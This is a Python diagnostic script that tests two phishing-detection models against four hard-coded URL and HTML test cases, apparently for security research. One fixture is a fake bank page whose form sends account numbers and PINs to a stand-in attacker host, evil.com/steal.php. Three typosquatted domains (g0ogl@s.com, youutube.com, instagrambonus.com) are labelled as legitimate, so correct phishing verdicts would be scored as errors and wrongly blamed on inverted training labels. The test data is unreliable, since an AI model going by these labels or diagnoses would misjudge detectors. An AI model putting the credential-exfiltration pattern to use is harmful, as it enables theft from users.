"""
Diagnostic script to test current models WITHOUT retraining
Run this to identify the exact problem
"""
import joblib
import pandas as pd
import sys
import os

# Go up 3 levels to reach the project root
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from Data_Preprocessing.feature_extract_2023 import ContentFeatureExtractor
from Data_Preprocessing.feature_extractor import URLFeatureExtractor

print("\n" + "="*80)
print(" 🔍 DIAGNOSTIC TEST - IDENTIFYING THE PROBLEM")
print("="*80)

# ---------------------------------------------------
# Load Models
# ---------------------------------------------------
print("\n📥 Loading models...")

try:
    model_2025 = joblib.load("Models/2025/model_2025.pkl")
    feats_2025 = joblib.load("Models/2025/features_2025.pkl")
    print("✅ Model 2025 loaded")
except Exception as e:
    print(f"❌ Model 2025 failed: {e}")
    model_2025 = None

try:
    model_2023 = joblib.load("Models/2023/model_2023.pkl")
    feats_2023 = joblib.load("Models/2023/features_2023.pkl")
    print("✅ Model 2023 loaded")
except Exception as e:
    print(f"❌ Model 2023 failed: {e}")
    model_2023 = None

# ---------------------------------------------------
# Test Cases
# ---------------------------------------------------
test_cases = [
    {
        "name": "Google",
        "url": "https://www.g0ogl@s.com",
        "html": """
        <html>
        <head>
            <title>Google</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="style.css">
            <script src="app.js"></script>
        </head>
        <body>
            <img src="logo.png">
            <form><input type="text"><input type="submit"></form>
            <a href="/about">About</a>
            <p>© 2024 Google</p>
        </body>
        </html>
        """,
        "expected_legit": True
    },
    {
        "name": "YouTube",
        "url": "https://www.youutube.com",
        "html": """
        <html>
        <head>
            <title>YouTube</title>
            <link rel="stylesheet" href="youtube.css">
            <script src="youtube.js"></script>
        </head>
        <body>
            <img src="logo.png"><img src="thumb1.jpg"><img src="thumb2.jpg">
            <a href="/watch">Video</a>
            <a href="https://twitter.com/youtube">Twitter</a>
        </body>
        </html>
        """,
        "expected_legit": True
    },
    {
        "name": "Instagram",
        "url": "https://www.instagrambonus.com",
        "html": """
        <html>
        <head>
            <title>Instagram</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="style.css">
            <script src="instagram.js"></script>
        </head>
        <body>
            <img src="logo.png">
            <form action="/accounts/login/">
                <input type="text" name="username">
                <input type="password" name="password">
                <input type="submit" value="Log In">
            </form>
        </body>
        </html>
        """,
        "expected_legit": True
    },
    {
        "name": "Phishing Site",
        "url": "http://secure-bank-verify.tk/update.php",
        "html": """
        <html>
        <head><title>Bank Account Verification</title></head>
        <body>
            <h1>Urgent: Update your bank account</h1>
            <form action="http://evil.com/steal.php">
                <input type="text" name="account">
                <input type="password" name="pin">
                <input type="hidden" name="csrf">
                <input type="submit" value="Update">
            </form>
        </body>
        </html>
        """,
        "expected_legit": False
    }
]

# ---------------------------------------------------
# Test Model 2025
# ---------------------------------------------------
if model_2025:
    print("\n" + "="*80)
    print(" 🧪 TESTING MODEL 2025 (URL-based)")
    print("="*80)
    
    extractor_2025 = URLFeatureExtractor()
    
    for test in test_cases:
        print(f"\n📝 {test['name']}: {test['url']}")
        print(f"   Expected: {'Legitimate' if test['expected_legit'] else 'Phishing'}")
        
        features = extractor_2025.extract(test['url'])
        df = pd.DataFrame([features]).reindex(columns=feats_2025, fill_value=0)
        
        proba = model_2025.predict_proba(df)[0]
        prob_legit = proba[0]
        prob_phish = proba[1]
        
        print(f"   Probabilities: [Legit={prob_legit:.4f}, Phish={prob_phish:.4f}]")
        
        # Determine prediction
        predicted_legit = prob_legit > prob_phish
        
        if predicted_legit == test['expected_legit']:
            print(f"   ✅ CORRECT")
        else:
            print(f"   ❌ WRONG - Model says {'Legitimate' if predicted_legit else 'Phishing'}")
            if test['expected_legit'] and prob_phish > 0.9:
                print(f"   ⚠️  CRITICAL: Model is HIGHLY confident it's phishing (99%+)")
                print(f"   🔍 Possible cause: Model was trained with inverted labels")

# ---------------------------------------------------
# Test Model 2023
# ---------------------------------------------------
if model_2023:
    print("\n" + "="*80)
    print(" 🧪 TESTING MODEL 2023 (Content-based)")
    print("="*80)
    
    extractor_2023 = ContentFeatureExtractor()
    
    for test in test_cases:
        print(f"\n📝 {test['name']}: {test['url']}")
        print(f"   Expected: {'Legitimate' if test['expected_legit'] else 'Phishing'}")
        
        features = extractor_2023.extract_from_html(test['html'], test['url'])
        df = pd.DataFrame([features]).reindex(columns=feats_2023, fill_value=0)
        
        proba = model_2023.predict_proba(df)[0]
        prob_legit = proba[0]
        prob_phish = proba[1]
        
        print(f"   Probabilities: [Legit={prob_legit:.4f}, Phish={prob_phish:.4f}]")
        
        # Determine prediction
        predicted_legit = prob_legit > prob_phish
        
        if predicted_legit == test['expected_legit']:
            print(f"   ✅ CORRECT")
        else:
            print(f"   ❌ WRONG - Model says {'Legitimate' if predicted_legit else 'Phishing'}")
            if test['expected_legit'] and prob_phish > 0.9:
                print(f"   ⚠️  CRITICAL: Model is HIGHLY confident it's phishing (99%+)")
                print(f"   🔍 Possible cause: Model was trained with inverted labels")

# ---------------------------------------------------
# Final Diagnosis
# ---------------------------------------------------
print("\n" + "="*80)
print(" 📋 DIAGNOSIS SUMMARY")
print("="*80)

print("\n🔍 If you see:")
print("   ✅ All tests pass → Models are working correctly")
print("   ❌ Legitimate sites get 99%+ phishing → Labels were inverted during training")
print("   ❌ Mixed results → Model needs more training data or feature engineering")

print("\n💡 Solutions:")
print("   1. If labels inverted → Retrain with corrected dataset")
print("   2. If mixed results → Adjust threshold or use weighted ensemble")
print("   3. Check test_results.pkl in Models/ folder for training metadata")

print("\n" + "="*80)